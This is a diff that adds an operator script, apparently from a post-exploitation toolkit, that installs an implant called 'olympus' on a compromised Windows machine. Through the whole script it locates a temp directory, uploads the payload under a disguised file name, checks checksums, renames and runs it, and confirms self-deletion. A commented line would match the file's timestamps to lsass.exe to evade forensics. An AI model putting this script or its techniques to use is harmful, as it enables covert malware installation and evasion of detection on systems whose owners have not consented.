@@ -1,0 +1,99 @@
+ifnot (`script canGetOut.eps`) {
+	echo "Cannot get out!!!  Not installing olympus!!\n";
+	return false;
+}
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir="E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+# get name of olympus file
+string $olyPath="$ScriptsDir\\..\\..\\olympus";
+string $olyFile="9B_ICB.ex_";
+#string $olyFile="install_933c.exe";
+
+# TODO: get better temp path directory
+### Get temp path
+string $temppath;
+#string $temppath="C:\\recycler\\S-1-5-21-1013845014-287268453-925700815-1069";
+@echo off;
+@record on;
+ifnot(`lpgetenv -option temppath`) {
+	`script temppath.eps`;
+	ifnot(`lpgetenv -option temppath`) {
+		echo "Could not get temp path.  Exiting.";
+		return false;
+	} else {
+		$temppath=GetCmdData("value");
+	}
+} else {
+	$temppath=GetCmdData("value");
+}
+@echo on;
+@record off;
+
+
+# put up as new name
+string $tempname="\$agn\$tst.tmp";
+string $newname="\$agn\$tst.exe";
+
+if (`dir "$tempname" -path "$temppath"`) {
+      echo "";
+	echo "Do you see $tempname?  If so, pause and delete.\n";
+	pause;
+}
+
+if (`dir "$newname" -path "$temppath"`) {
+      echo "";
+	echo "Do you see $newname?  If so, pause and delete.\n";
+	pause;
+}
+
+ifnot (`put "$olyPath\\$olyFile" -name "$temppath\\$tempname" -permanent`) {
+	echo "ERROR putting up olympus!";
+	pause;
+} else {
+	# Compare checksums
+	ifnot (`script checksum.eps "$olyFile" "$olyPath" "$tempname" "$temppath"`) {
+		`del $tempname -path $temppath`;
+		return false;
+	}
+}
+
+# match times
+#`matchtimes $systemroot\\system32\\lsass.exe $newname`;
+
+# run
+if (prompt "Run olympus installer?") {
+	if (`move "$temppath\\$tempname" "$temppath\\$newname"`) {
+		`run -command "$temppath\\$newname"`;
+		echo "Hit return when done running.";
+		pause;
+		echo "Successfully installed Olympus ($olyFile)";
+		if (`dir "$tempname" -path "$temppath"`) {
+                  echo "";
+                  echo "Olympus should have deleted itself.";
+                  echo "  Has $tempname been deleted?  If not, pause and delete.\n";
+                  pause;
+		}
+            if (`dir "$newname" -path "$temppath"`) {
+                  echo "";
+                  echo "  Has $newname been deleted?  If not, pause and delete.\n";
+                  pause;
+            }
+            return true;
+	} else {
+		echo "Error renaming olympus!!";
+		return false;
+	}
+} else {
+	return true;
+}
